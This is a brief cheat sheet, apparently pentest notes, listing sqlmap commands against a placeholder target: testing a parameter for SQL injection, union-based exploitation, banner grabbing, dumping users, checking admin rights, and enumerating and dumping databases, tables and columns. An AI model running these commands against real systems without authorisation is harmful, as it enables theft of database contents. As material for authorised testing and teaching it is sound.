### sqlmap

#### Scanning for SQLi
To scan a URL for SQL injection vulnerabilities:

  ```bash
  # The -p flag allows you to specify which get parameter to test
  sqlmap -u http://target.site?id=1 -p id
  ```
#### Exploit Union-Based In-Band SQLi
To exploit a Union-Based In-Band SQLi, use:

  ```bash
  # The --technique switch allows you to specify a SQLi type
  sqlmap -u http://target.site?id=1 -p id --technique=U
  ```

SQLMap will discover the correct technique to use on its own, but specifying the technique manually is a best practice. This prevents you from sending an excessive number of payloads and reduces the risk that you'll damage the database.

#### Banner Grabbing
To grab the database banner, use:

  ```bash
  sqlmap -u http://target.site?id=1 -p id --technique=U --banner
  ```

This reports the database and OS version in use. This is useful information to include in your report as a proof of vulnerability.

#### Dumping Users
To dump the users stored in a database, use:

  ```bash
  sqlmap -u http://target.site?id=1 -p id --technique=U --users
  ```

#### Checking if the User is Admin
To check if the server connects to the database as an administrator, use:

  ```bash
  sqlmap -u http://target.site?id=1 -p id --technique=U --is-dba
  ```

#### Dumping Data
To list all available databases, use:

  ```bash
  sqlmap -u http://target.site?id=1 -p id --technique=U --dbs
  ```

To list all tables in a particular database, use:

  ```bash
  sqlmap -u http://target.site?id=1 -p id -D <database> --tables
  ```

...Where `<database>` is the name of one of the databases output by `--dbs`.

To list columns from a given table, use:

  ```bash
  sqlmap -u http://target.site?id=1 -p id -D <database> -T <table> --columns
  ```

...Where `<table>` is the name of one of the tables output by `--tables`.

To dump just specific columns, use:

  ```bash
  sqlmap -u http://target.site?id=1 -p id -D <database> -T <table> -C <column> --dump
  ```

...Where `<column>` is the name of one of the columns output by `--columns`.
